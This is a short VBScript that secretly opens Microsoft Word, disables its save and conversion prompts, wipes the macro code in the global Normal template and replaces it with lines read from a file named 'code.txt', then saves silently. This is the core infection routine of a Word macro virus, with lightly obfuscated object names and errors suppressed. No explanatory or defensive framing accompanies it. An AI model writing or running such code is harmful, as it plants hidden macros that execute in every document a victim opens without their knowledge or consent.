On error resume next
fs="FileSystemObject"
sc="Scripting"
wsc="WScript"
sh="Shell"
crlf=Chr(13)&Chr(10)

Set fso=CreateObject(sc & "." & fs)
Set ws=CreateObject(wsc & "." & sh)

Set wrd=CreateObject("Word.Application")
wrd.Visible = False
wrd.Options.SaveNormalPrompt = False
wrd.Options.ConfirmConversions = False
Set nor=wrd.NormalTemplate.vbproject.vbcomponents(1).codemodule
set iw=fso.OpenTextFile("code.txt",1,True)
nor.DeleteLines 1,nor.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.ReadLine
nor.InsertLines i, b
i = i + 1
Loop
wrd.NormalTemplate.Save
wrd.Quit
